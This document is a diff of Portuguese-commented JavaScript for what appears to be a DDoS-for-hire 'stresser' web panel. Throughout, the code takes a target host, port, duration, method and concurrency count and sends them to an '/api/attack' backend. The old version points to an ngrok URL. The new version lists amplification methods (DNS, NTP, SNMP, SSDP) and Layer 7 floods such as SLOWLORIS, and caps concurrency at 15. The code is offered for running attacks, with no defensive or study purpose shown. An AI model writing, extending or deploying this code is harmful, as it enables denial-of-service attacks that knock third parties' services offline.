@@ -1,83 +1,95 @@
-document.getElementById('attack-button').addEventListener('click', function() {
-    const host = document.getElementById('host').value;
-    const port = parseInt(document.getElementById('port').value);
-    const time = parseInt(document.getElementById('time').value);
-    const method = document.getElementById('method').value;
-    const concurrents = parseInt(document.getElementById('concurrents').value);
-
-    const ngrokUrl = 'https://suitably-meet-sawfish.ngrok-free.app/api/attack';  // Atualize para o endereço correto
-
-    // Envia múltiplas requisições conforme o valor de 'concurrents'
-    for (let i = 0; i < concurrents; i++) {
-        axios.get(`${ngrokUrl}?host=${host}&port=${port}&time=${time}&method=${method}`)
-            .then(response => {
-                showAlert('Attack initiated successfully', 'success');
-                const logRow = updateLog(host, port, method, time, `Running: ${time}s`);
-                startCountdown(time, logRow);
-            })
-            .catch(error => {
-                showAlert('An error occurred: ' + error, 'danger');
-            });
-    }
-});
-
-// Função para iniciar contagem regressiva
-function startCountdown(seconds, logRow) {
-    const countdownElement = logRow.querySelector('.log-status');
-    countdownElement.innerText = `Running: ${seconds}s`;
-
-    const interval = setInterval(() => {
-        seconds--;
-        countdownElement.innerText = `Running: ${seconds}s`;
-        if (seconds <= 0) {
-            clearInterval(interval);
-            countdownElement.innerText = 'Expired';
-        }
-    }, 1000);
-}
-
-// Função para exibir alertas
-function showAlert(message, type) {
-    const alertContainer = document.getElementById('alert-container');
-    const alertBox = document.createElement('div');
-    alertBox.className = `alert alert-${type}`;
-    alertBox.textContent = message;
-    alertContainer.appendChild(alertBox);
-
-    setTimeout(() => {
-        alertBox.remove();
-    }, 3000);
-}
-
-// Função para atualizar o log
-function updateLog(host, port, method, time, status) {
-    const logEntries = document.getElementById('log-entries');
-    const logRow = document.createElement('tr');
-    logRow.innerHTML = `<td>${host}</td><td>${port}</td><td>${method}</td><td class="log-status">${status}</td>`;
-    logEntries.appendChild(logRow);
-    return logRow;
-}
-
-// Função para atualizar as opções do campo "Method" com base no protocolo selecionado
-document.getElementById('protocol').addEventListener('change', function() {
-    const protocol = this.value;
+document.addEventListener('DOMContentLoaded', function() {
+    const attackButton = document.getElementById('attack-button');
+    const protocolSelect = document.getElementById('protocol');
     const methodSelect = document.getElementById('method');
-    methodSelect.innerHTML = '';
+    const concurrentsRange = document.getElementById('concurrents');
+    const concurrentValue = document.getElementById('concurrent-value');
+    const alertContainer = document.getElementById('alert-container');
+    const logEntries = document.getElementById('log-entries');
 
-    let options = [];
-    if (protocol === 'amplification') {
-        options = ['DNS', 'TCPMB'];
-    } else if (protocol === 'Layer7') {
-        options = ['HTTPBYPASS', 'TLS', 'SITEBROWSER', 'SITEBEACH', 'HTTP1', 'HTTP2'];
+    const methods = {
+        amplification: ['DNS', 'NTP', 'SNMP', 'SSDP'],
+        Layer7: ['GET', 'POST', 'HEAD', 'SLOWLORIS']
+    };
+
+    protocolSelect.addEventListener('change', function() {
+        const selectedProtocol = protocolSelect.value;
+        const options = methods[selectedProtocol] || [];
+        
+        methodSelect.innerHTML = '';
+        options.forEach(function(method) {
+            const option = document.createElement('option');
+            option.value = method;
+            option.textContent = method;
+            methodSelect.appendChild(option);
+        });
+    });
+
+    // Trigger the change event to populate the methods for the default selected protocol
+    protocolSelect.dispatchEvent(new Event('change'));
+
+    attackButton.addEventListener('click', async function() {
+        const host = document.getElementById('host').value;
+        const port = document.getElementById('port').value;
+        const time = document.getElementById('time').value;
+        const method = document.getElementById('method').value;
+        const concurrents = concurrentsRange.value;
+        const userId = JSON.parse(localStorage.getItem('user')).id;
+
+        if (!host || !port || !time || !method) {
+            alert('Por favor, preencha todos os campos.');
+            return;
+        }
+
+        try {
+            const response = await axios.get('/api/attack', {
+                params: {
+                    host,
+                    port,
+                    time,
+                    method,
+                    userId,
+                    concurrents
+                }
+            });
+
+            if (response.status === 200) {
+                document.getElementById('response').textContent = JSON.stringify(response.data, null, 2);
+                addLogEntry(host, port, method, 'Success');
+            } else {
+                showAlert(response.data.error);
+                document.getElementById('response').textContent = response.data.error;
+                addLogEntry(host, port, method, 'Failed');
+            }
+        } catch (error) {
+            showAlert('Erro ao realizar ataque: ' + error.message);
+            document.getElementById('response').textContent = 'Erro ao realizar ataque: ' + error.message;
+            addLogEntry(host, port, method, 'Failed');
+        }
+    });
+
+    concurrentsRange.addEventListener('input', function() {
+        concurrentValue.textContent = `${this.value} / 15`;
+    });
+
+    function showAlert(message) {
+        const alert = document.createElement('div');
+        alert.className = 'alert alert-danger';
+        alert.textContent = message;
+        alertContainer.appendChild(alert);
+        setTimeout(() => {
+            alert.remove();
+        }, 3000);
     }
 
-    options.forEach(option => {
-        const opt = document.createElement('option');
-        opt.value = option;
-        opt.textContent = option;
-        methodSelect.appendChild(opt);
-    });
+    function addLogEntry(target, port, method, status) {
+        const row = document.createElement('tr');
+        row.innerHTML = `
+            <td>${target}</td>
+            <td>${port}</td>
+            <td>${method}</td>
+            <td>${status}</td>
+        `;
+        logEntries.appendChild(row);
+    }
 });
-
-// Inicializar opções de Method com o valor padrão do protocolo selecionado
-document.getElementById('protocol').dispatchEvent(new Event('change'));
